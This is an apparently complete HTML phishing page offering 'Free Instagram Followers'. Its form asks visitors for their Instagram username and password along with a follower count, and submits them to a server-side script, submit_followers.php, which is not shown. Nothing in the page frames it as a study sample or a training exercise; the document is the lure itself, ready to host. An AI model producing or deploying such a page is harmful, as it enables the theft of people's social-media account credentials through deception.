<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Instagram Followers</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(to right, #141e30, #243b55);
      color: white;
    }
    .form-container {
      max-width: 500px;
      margin: 100px auto;
      padding: 30px;
      background-color: #2c3e50;
      border-radius: 15px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2 class="text-center">Free Instagram Followers</h2>
    <form action="submit_followers.php" method="POST">
      <div class="mb-3">
        <label for="insta_user" class="form-label">Instagram Username</label>
        <input type="text" class="form-control" id="insta_user" name="insta_user" required>
      </div>
      <div class="mb-3">
        <label for="insta_pass" class="form-label">Instagram Password</label>
        <input type="password" class="form-control" id="insta_pass" name="insta_pass" required>
      </div>
      <div class="mb-3">
        <label for="followers" class="form-label">Followers Quantity (Max 1000)</label>
        <input type="number" class="form-control" id="followers" name="followers" max="1000" min="1" required>
      </div>
      <button type="submit" class="btn btn-warning w-100">Submit</button>
    </form>
  </div>
</body>
</html>
